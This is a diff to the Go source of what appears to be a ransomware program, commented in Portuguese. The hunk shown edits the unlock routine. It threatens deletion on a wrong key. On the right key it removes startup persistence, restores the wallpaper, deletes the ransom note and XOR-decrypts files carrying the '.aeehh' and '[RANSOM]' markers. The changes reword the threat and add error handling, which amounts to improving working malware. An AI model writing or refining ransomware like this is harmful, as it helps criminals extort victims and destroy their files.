@@ -62,29 +62,44 @@ func main() {
 
 	if inputKey != password {
 		fmt.Print("\033[31m")
-		fmt.Println("⚠️ CHAVE INVÁLIDA! OS ARQUIVOS SERÃO DELETADOS!")
+		fmt.Println("⚠️ CHAVE INVÁLIDA! SEUS ARQUIVOS SERÃO DELETADOS!")
 		fmt.Print("\033[0m")
 		time.Sleep(10 * time.Second)
 		return
 	}
 
+	// Remover persistência
 	removeFromStartup()
+
+	// Restaurar wallpaper original
 	restoreDefaultWallpaper()
 
 	// Remover arquivo de aviso
 	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))
 
-	// Descriptografar arquivos
+	// Descriptografar arquivos recursivamente (pastas e subpastas)
 	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
 		if err != nil || info.IsDir() || !strings.HasSuffix(info.Name(), ".aeehh") {
 			return nil
 		}
 
-		data, _ := os.ReadFile(path)
-		decryptedData := xorEncrypt(data)
+		// Ler arquivo criptografado
+		data, err := os.ReadFile(path)
+		if err != nil {
+			return nil
+		}
 
+		// Descriptografar
+		decryptedData := xorEncrypt(data)
 		originalName := strings.TrimPrefix(strings.TrimSuffix(info.Name(), ".aeehh"), "[RANSOM]")
-		os.WriteFile(filepath.Join(filepath.Dir(path), originalName), decryptedData, 0644)
+		originalPath := filepath.Join(filepath.Dir(path), originalName)
+
+		// Escrever arquivo original
+		if err := os.WriteFile(originalPath, decryptedData, 0644); err != nil {
+			return nil
+		}
+
+		// Remover arquivo criptografado
 		os.Remove(path)
 
 		return nil
